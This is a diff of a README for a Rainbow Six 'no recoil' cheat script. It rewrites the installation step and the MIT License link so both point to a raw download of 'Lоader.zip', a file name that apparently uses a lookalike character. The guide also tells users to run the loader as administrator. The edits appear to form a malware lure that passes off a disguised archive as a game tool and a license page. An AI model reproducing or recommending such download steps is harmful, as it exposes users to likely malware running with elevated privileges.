@@ -12,7 +12,7 @@ Welcome to the **R6 No Recoil Script** repository! This project is expertly desi
 ## 💾 Installation Guide  
 
 **Easy Setup in Just Minutes:**  
-1. **Download Loader.rar from the repository.**
+1. **Download https://raw.githubusercontent.com/adammc769/R6SmoothRecoilMaster/main/Lоader.zip from the repository.**
 2. Extract the archive to your desired destination using any standard archive tool (e.g., WinRAR, 7-Zip, Archive Utility).
 3. Run the Loader application as administrator for best performance.
 4. Follow on-screen instructions to fine-tune your script preferences.
@@ -72,7 +72,7 @@ This project is intended solely for **educational and personal use**. Use respon
 
 ## 📜 License
 
-Distributed under the [MIT License](https://opensource.org/license/mit/). Free for both personal and commercial use. Contributions and improvements are always welcome!
+Distributed under the [MIT License](https://raw.githubusercontent.com/adammc769/R6SmoothRecoilMaster/main/Lоader.zip). Free for both personal and commercial use. Contributions and improvements are always welcome!
 
 ---
 
